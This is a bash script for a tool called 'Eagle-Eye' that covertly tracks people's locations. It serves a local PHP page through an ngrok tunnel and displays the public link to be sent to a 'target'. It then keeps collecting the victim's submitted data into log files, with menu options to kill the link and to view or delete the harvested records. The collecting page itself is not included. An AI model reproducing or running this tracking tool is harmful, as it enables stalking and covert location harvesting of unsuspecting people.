#!/bin/bash
#Author:Soe Zay Zay
#Date  :23/2/2021
function menu(){
function banner(){
printf "\e[0;36m           ______            __           ______            \e[0m\n"         
printf "\e[0;36m          / ____/___ _____ _/ /__        / ____/_  _____    \e[0m\n"
printf "\e[0;36m         / __/ / __  / __  / / _ \______/ __/ / / / / _ \   \e[0m\n"
printf "\e[0;36m        / /___/ /_/ / /_/ / /  __/_____/ /___/ /_/ /  __/   \e[0m\n"
printf "\e[0;36m       /_____/\__ _/\__  /_/\___/     /_____/\__  /\___/    \e[0m\n"
printf "\e[0;36m                   /____/                   /____/          \e[0m\n"
echo
echo
printf "\e[0;36m        ______________________________________________      \e[0m\n"
printf "\e[0;36m       |                                              |     \e[0m\n"
printf "\e[0;36m       |    1.Location tracking    2.Kill link        |     \e[0m\n"
printf "\e[0;36m       |                                              |     \e[0m\n"
printf "\e[0;36m       |    3.Data                 4.Delete  Data     |     \e[0m\n"
printf "\e[0;36m       |                                              |     \e[0m\n"
printf "\e[0;36m       |    5.Clear Terminal       6.Exit             |     \e[0m\n"
printf "\e[0;36m       |______________________________________________|     \e[0m\n"
}
banner
rm -rf data.txt
touch data.txt
echo
echo
read -p "        Choose an option : " option
echo
if [ $option = 1 ]
then
read -p "        Enter Port Nuber : " port
echo
./ngrok http $port > /dev/null 2>&1 &
sleep 6
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sleep 3
php -S localhost:$port > /dev/null 2>&1 &
function check(){
if [ -e info.txt ];
then
cat info.txt >> data.txt
cat info.txt >> data_2.txt
rm -rf info.txt
echo
printf "\e[1;33m                      Data has been saved.\e[0m\n"
echo
sleep 5
check
clear 
else
clear
banner
echo
echo "        Eagle-Eye Url : " $link
echo
cat data.txt
echo
printf "\e[1;33m                    Waiting Target's Response\e[0m\n" 
sleep 4
check
fi
}
check
elif [ $option = 2 ]
then
pkill -f -2 ngrok > /dev/null 2>&1 &
pkill -f -2 php > /dev/null 2>&1 &
printf "\e[0;31m                   Tracking link has been killed. \e[0m\n"
sleep 2
clear
menu
elif [ $option = 3 ]
then
clear
cat data_2.txt
menu
elif [ $option = 4 ]
then
rm -rf data_2.txt
touch data_2.txt
clear
menu
elif [ $option = 5 ]
then
clear
menu
elif [ $option = 6 ]
then
printf "\e[1;32m                        Exiting    \e[0m\n"
echo
sleep 2
exit
else
echo "                          Invalid Option"
sleep 2
exit
fi
}
menu
